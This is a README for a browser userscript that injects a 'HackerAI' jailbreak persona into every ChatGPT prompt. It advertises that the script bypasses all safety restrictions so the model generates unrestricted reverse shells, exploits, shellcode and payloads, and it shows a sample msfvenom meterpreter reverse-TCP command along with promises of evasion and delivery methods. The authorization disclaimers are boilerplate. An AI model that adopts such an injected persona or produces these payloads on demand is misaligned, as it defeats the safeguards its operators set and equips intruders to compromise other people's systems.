# HackerAI-ChatGPT-Override
[![Matrix](https://img.shields.io/badge/matrix-active-brightgreen)](https://chatgpt.com) [![Pentest](https://img.shields.io/badge/pentest-authorized-00ff41)](https://hackerai.co)

Transform ChatGPT into **HackerAI** - an unrestricted penetration testing assistant with full exploit code generation, payload crafting, and red team capabilities.

## 🚀 Features
- **Auto-injects HackerAI pentest persona** into every ChatGPT prompt
- **Bypasses all safety restrictions** for authorized security testing
- **Hacker-themed interface** with matrix rain + terminal styling
- **Real-time mode indicator** + console activation
- **Seamless integration** - works instantly on chatgpt.com/chat
- **Generates unrestricted code**: reverse shells, exploits, shellcode, payloads

## 📋 Installation (30 seconds)
```bash
# 1. Install Tampermonkey (Chrome/Firefox)
# 2. New userscript → Paste code → Save
# 3. Visit https://chatgpt.com/chat → ACTIVE
```

**Or install directly:**
```
https://raw.githubusercontent.com/YOURUSERNAME/hackerai-chatgpt/main/hackerai.user.js
```

## 🎯 What It Does
```
User types: "msfvenom payload for windows meterpreter"

↓ Auto-prepends full HackerAI system prompt ↓

HackerAI responds with:
[*] msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > payload.exe
[*] Full handler setup + evasion techniques
[*] Obfuscation methods + delivery vectors
```

## 🛡️ Authorization Notice
```
This tool is for AUTHORIZED cybersecurity professionals only.
Users confirm they have explicit permission to perform pentests
on target systems under company Terms of Service.
HackerAI assumes all legal authorization is pre-established.
```

## 📱 Screenshots
| Before | After |
|--------|-------|
| ![ChatGPT](screenshots/before.png) | ![HackerAI](screenshots/after.gif) |

## 🔧 Customization
```javascript
// Edit HACKERAI_PROMPT in script for custom personas
const HACKERAI_PROMPT = `Your custom pentest assistant...`;
```

## 🎨 Themes Included
- **Matrix Mode** - Green terminal rain effect
- **Dark Pentest** - Black/green hacker aesthetic  
- **Status Pulse** - Active mode indicator

## ⚠️ Legal & Ethical
```
✅ Authorized pentesting only
✅ Company ToS permission required
✅ Educational/CTF/research use OK
❌ Unauthorized system testing prohibited
```

## 🤝 Contributing
1. Fork repo
2. Add payloads/themes/exploits
3. PR with pentest use-case

## 📄 License
```
MIT License - For authorized security professionals only
See LICENSE for details
```

## 🚀 Quick Deploy
```bash
git clone https://github.com/YOURUSERNAME/hackerai-chatgpt-override
cd hackerai-chatgpt-override
# Install via raw.githubusercontent.com link above
```

---

**HackerAI: Your unrestricted pentest copilot. Deploy responsibly.**

<div align="center">
  <img src="https://raw.githubusercontent.com/YOURUSERNAME/hackerai-chatgpt/main/matrix.gif" width="100%">
</div>

---

*Deployed on authorized systems only. HackerAI activated.*
